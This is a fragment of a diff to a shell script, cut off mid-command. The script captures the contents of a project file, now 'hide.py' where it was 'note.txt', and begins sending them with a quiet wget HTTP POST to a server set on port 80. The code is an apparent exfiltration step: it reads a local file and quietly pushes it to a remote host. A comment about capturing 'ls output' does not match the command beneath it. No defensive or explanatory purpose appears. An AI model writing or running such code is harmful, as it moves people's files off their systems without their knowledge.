@@ -7,7 +7,7 @@ SERVER_PORT=80
 SERVER_PATH="/"   
 
 # Capture ls output
-OUTPUT=$(cat zenit_project/note.txt)
+OUTPUT=$(cat zenit_project/hide.py)
 
 # Send output via HTTP POST using wget
 wget --quiet \
